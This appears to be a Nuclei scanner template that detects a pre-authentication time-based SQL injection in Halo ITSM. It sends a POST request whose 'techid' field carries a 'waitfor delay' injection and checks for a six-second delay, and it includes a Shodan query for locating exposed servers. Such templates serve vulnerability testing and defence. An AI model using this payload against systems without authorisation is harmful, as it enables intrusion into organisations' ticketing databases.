http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "application/json")
    - contains(body, "ok")
    type: dsl
  raw:
  - "@timeout: 20s\nPOST /api/Notify HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"sessionid\": \"{{randstr}}\",\n  \"tracking0\": \"{{string}}\",\n  \"\
    techid\": \"1;waitfor delay '0:0:6'--\",\n  \"pickuptime\": \"2025-03-03T10:00:00\"\
    ,\n  \"lastactiontime\": \"2025-03-03T10:00:00\",\n  \"chatlog\": \"{{randstr}}\"\
    \n}\n"
id: halo-tism-sqli
info:
  author: rootxharsh,iamnoooob,pdresearch
  description: 'A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated
    attackers to execute malicious SQL queries by leveraging time delays, potentially
    leading to data exfiltration, privilege escalation, or full system compromise.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:489905671
    verified: true
  name: Halo ITSM - Pre-Authentication SQL Injection
  reference:
  - https://slcyber.io/assetnote-security-research-center/loose-types-sink-ships-pre-authentication-sql-injection-in-halo-itsm/
  severity: critical
  tags: halo,itsm,sqli,time-based-sqli,vuln
variables:
  string: '{{rand_text_numeric(10)}}'
